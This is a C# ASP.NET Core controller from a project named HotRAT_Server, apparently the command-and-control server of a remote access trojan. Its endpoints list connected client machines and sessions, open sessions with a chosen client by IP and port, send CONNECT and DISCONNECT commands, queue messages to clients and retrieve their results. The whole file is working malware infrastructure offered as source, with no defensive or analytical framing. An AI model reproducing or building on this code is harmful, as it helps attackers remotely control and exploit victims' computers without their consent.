using HotRAT_Server.Models;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Newtonsoft.Json;
using System;
using System.Net.Sockets;
using static System.Collections.Specialized.BitVector32;
using static System.Net.Mime.MediaTypeNames;

namespace HotRAT_Server.Controllers
{
    [Route("api/connect")]
    [ApiController]
    public class ConnectController : ControllerBase
    {
        [HttpGet("sessions")]
        public IActionResult GetAllSessions([FromQuery] string token)
        {
            if (string.IsNullOrEmpty(token) || token != AuthModel.Token())
            {
                return Ok(new { code = 203, data = "Invalid or missing token" });
            }

            return Ok(new { code = 200, data = HotRAT_Server.Program.server._sessions });
        }

        [HttpGet("clients")]
        public IActionResult GetAllClients([FromQuery] string token)
        {
            if (string.IsNullOrEmpty(token) || token != AuthModel.Token())
            {
                return Ok(new { code = 203, data = "Invalid or missing token" });
            }

            return Ok(new { code = 200, data = HotRAT_Server.Program.server._clients.Values });
        }


        [HttpGet("connect")]
        public IActionResult Connect([FromQuery] string token, [FromQuery] string ip, [FromQuery] int port)
        {
            if (string.IsNullOrEmpty(token) || token != AuthModel.Token())
            {
                return Ok(new { code = 203, data = "Invalid or missing token" });
            }

            var client = Program.server.GetClientByIpPort(ip, port);
            if (string.IsNullOrEmpty(client))
            {
                return Ok(new { code = 404, data = "Client not found" });
            }

            foreach (var sessionA in Program.server._sessions.Values)
            {
                if (sessionA.ClientIp == ip && sessionA.ClientPort == port.ToString())
                {
                    return Ok(new { code = 400, data = $"Client IP and port already connected\n{sessionA.Id}" });
                }
            }

            int count = 0;
            foreach (var clients in Program.server._clients.Values)
            {
                if (clients.IP == ip && clients.Port == port)
                {
                    count++;
                }
            }
            if(count == 0) return Ok(new { code = 200, data = "Not found client" });

            var sessionId = Guid.NewGuid();
            var session = new SessionModel
            {
                Id = sessionId.ToString(),
                Token = token,
                ClientIp = ip,
                ClientPort = port.ToString(),
                Historys = Array.Empty<MessageModel>()
            };
            Console.WriteLine($"Id:{session.Id} Token:{session.Token} Ip:{session.ClientIp}{session.ClientPort}");
            
            Program.server._sessions[sessionId.ToString()] = session;

            _ = Program.server.SendMessage(session.Id, $"CONNECT\n{session.Id}");
            return Ok(new { code = 200, data = sessionId.ToString() });
        }


        [HttpGet("disconnect")]
        public IActionResult Disconnect([FromQuery] string token, [FromQuery] string id)
        {
            if (string.IsNullOrEmpty(token) || token != AuthModel.Token())
            {
                return Ok(new { code = 203, data = "Invalid or missing token" });
            }

            if (Guid.TryParse(id, out Guid sessionGuid) && HotRAT_Server.Program.server._sessions.ContainsKey(sessionGuid.ToString()))
            {
                HotRAT_Server.Program.server._sessions.Remove(sessionGuid.ToString());
                return Ok(new { code = 200, data = "Session disconnected successfully" });
            }
            _ = Program.server.SendMessage(id, $"DISCONNECT\n{id}");
            return Ok(new { code = 404, data = "Session not found" });
        }

        [HttpPost("addmsg")]
        public async Task<IActionResult> AddMessage([FromForm] string token, [FromForm] string id, [FromForm] string text)
        {
            if (string.IsNullOrEmpty(token) || token != AuthModel.Token())
            {
                return Ok(new { code = 203, data = false });
            }
            else
            {
                var result = await Program.server.AddMessagesToSession(id, text);
                return Ok(new { code = 200, data = result });
            }
        }

        [HttpGet("getsession")]
        public IActionResult GetSession([FromQuery] string token, [FromQuery] string id)
        {
            if (string.IsNullOrEmpty(token) || token != AuthModel.Token())
            {
                return Ok(new { code = 203, data = false });
            }

            if (Guid.TryParse(id, out Guid sessionGuid) && Program.server._sessions.ContainsKey(sessionGuid.ToString()))
            {
                return Ok(new { code = 200, data = Program.server._sessions[sessionGuid.ToString()] });
            }

            return Ok(new { code = 404, data = "Session not found" });
        }

        [HttpGet("getclient")]
        public IActionResult GetClient([FromQuery] string token, [FromQuery] string ip, [FromQuery] int port)
        {
            if (string.IsNullOrEmpty(token) || token != AuthModel.Token())
            {
                return Ok(new { code = 203, data = false });
            }

            foreach (var clients in Program.server._clients.Values)
            {
                if (clients.IP == ip && clients.Port == port)
                {
                    return Ok(new { code = 200, data = clients });
                }
            }

            return Ok(new { code = 404, data = "Client not found" });
        }

        [HttpGet("getwork")]
        public IActionResult GetWork([FromQuery] string token, [FromQuery] string id, [FromQuery] string code)
        {
            if (string.IsNullOrEmpty(token) || token != AuthModel.Token())
            {
                return Ok(new { code = 203, data = false });
            }

            if (Guid.TryParse(id, out Guid sessionGuid) && Program.server._sessions.ContainsKey(sessionGuid.ToString()))
            {
                foreach (var message in Program.server._sessions[sessionGuid.ToString()].Historys.ToArray())
                {
                    if(message.Code == code)
                    {
                        return Ok(new { code = 200, data = message });
                    }
                }
            }

            return Ok(new { code = 404, data = "Client not found" });
        }
    }
}
